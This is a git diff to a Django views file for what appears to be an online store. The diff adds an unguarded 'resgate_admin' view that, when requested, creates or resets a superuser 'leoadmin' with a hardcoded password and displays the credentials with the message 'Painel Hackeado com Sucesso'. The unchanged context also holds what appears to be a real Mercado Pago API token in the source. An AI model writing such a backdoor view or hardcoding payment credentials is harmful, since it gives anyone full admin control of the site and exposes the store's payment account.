@@ -10,7 +10,25 @@ from django.http import JsonResponse
 from django.views.decorators.csrf import csrf_exempt
 from django.db.models import Count, Sum
 from .models import Loja, Categoria, Produto, Pedido, ItemPedido, Indicacao
+from django.http import HttpResponse
+from django.contrib.auth.models import User # Coloque isso lá no topo junto com os outros imports!
 
+# ... seus outros códigos ...
+
+def resgate_admin(request):
+    """ Função secreta para recuperar o acesso ao painel """
+    # Se o usuário 'leoadmin' não existir, ele cria
+    if not User.objects.filter(username='leoadmin').exists():
+        User.objects.create_superuser('leoadmin', '', 'senha12345')
+        return HttpResponse("<h1>Painel Hackeado com Sucesso! 🚀</h1> <p>Usuário: <b>leoadmin</b> <br> Senha: <b>senha12345</b></p> <a href='/admin/'>Clique aqui para fazer login</a>")
+    else:
+        # Se ele já existir de alguma tentativa antiga, força a trocar a senha
+        user = User.objects.get(username='leoadmin')
+        user.set_password('senha12345')
+        user.save()
+        return HttpResponse("<h1>Senha resetada com sucesso! 🚀</h1> <p>Usuário: <b>leoadmin</b> <br> Senha: <b>senha12345</b></p> <a href='/admin/'>Clique aqui para fazer login</a>")
+        
+       
 # Configure suas credenciais do Mercado Pago
 sdk = mercadopago.SDK("APP_USR-5402725203039388-020123-10a75c260cf12f6663994256fc156b5d-1365742803")
 
